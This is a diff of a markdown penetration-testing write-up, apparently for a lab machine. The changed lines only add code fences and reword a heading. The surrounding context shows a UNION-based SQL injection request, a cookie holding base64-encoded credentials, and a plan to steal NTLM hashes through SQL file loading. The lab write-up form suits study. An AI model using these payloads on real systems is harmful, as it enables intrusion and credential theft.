@@ -88,7 +88,9 @@ Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
 Connection: close
 
 term=1'union+select+1,@@version,3-- -
+```
 
+```
 this returns user: `root@localhost`
 
 lucky guess:
@@ -109,7 +111,7 @@ ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB 
 
 This password does not work on SMB. 
 
-## NTLM Stealing from insecure file_load in SQL
+## NTLM theft from insecure file_load in SQL
 A possibility would be to capture an NTLM hash since SQLI is present.
 
 Resources: 
